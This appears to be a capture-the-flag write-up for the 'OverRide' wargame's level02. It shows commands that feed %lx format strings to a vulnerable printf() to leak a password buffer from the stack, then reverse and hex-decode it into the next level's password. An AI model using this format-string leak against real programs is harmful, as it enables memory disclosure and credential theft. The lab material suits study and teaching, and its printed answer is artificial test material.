@@ -1,0 +1,37 @@
+The program use fgets to read the password file for the next level
+
+Here the vulnerability resides in the printf() call
+as user can set the format string to read data from the stack
+This is a Format String Attack
+
+We need to print the stack memory with a lot of %lx
+
+level02@OverRide:~$> python -c 'print "%lx "*25' | ./level02
+[...]
+7fffffffe500 0 20 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 7fffffffe6f8 1f7ff9a08 20 0 0 0 0 0 0 0 0 0 0 0 100000000 0 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 does not have access!
+
+we've read data here, it might be the passwd buffer starting at argument 22
+so here we print the 5 arguments that correspond to the passwd buffer
+
+level02@OverRide:~$> python -c 'print "%22$lx %23$lx %24$lx %25$lx %26$lx"' | ./level02
+[...]
+756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d does not have access!
+
+but remember the endianess we need to switch arround the byte the make it in the right order
+
+       argument 22       -       argument 23       -       argument 24       -       argument 25       -       argument 26
+|  |  |  |  |  |  |  |  |-|  |  |  |  |  |  |  |  |-|  |  |  |  |  |  |  |  |-|  |  |  |  |  |  |  |  |-|  |  |  |  |  |  |  |  |
+  7  6  5  4  3  2  1  0   15 14 13 12 11 10  9  8   23 22 21 20 19 18 17 16   31 30 29 28 27 26 25 24   39 38 37 36 35 34 33 32
+so we print the argument backward and then reverse the string
+
+       argument 26       -       argument 25       -       argument 24       -       argument 24       -       argument 23
+|  |  |  |  |  |  |  |  |-|  |  |  |  |  |  |  |  |-|  |  |  |  |  |  |  |  |-|  |  |  |  |  |  |  |  |-|  |  |  |  |  |  |  |  |
+ 39 38 37 36 35 34 33 32   31 30 29 28 27 26 25 24   23 22 21 20 19 18 17 16   15 14 13 12 11 10  9  8   7  6  5  4  3  2  1  0
+
+
+level02@OverRide:~$> python -c 'print "%26$lx%25$lx%24$lx%23$lx%22$lx"' | ./level02
+[...]
+48336750664b394d354a35686e475873377a7143574e675845414a3561733951756e505234376848 does not have access!
+
+level02@OverRide:~$> echo 48336750664b394d354a35686e475873377a7143574e675845414a3561733951756e505234376848 | xxd -r -p | rev
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
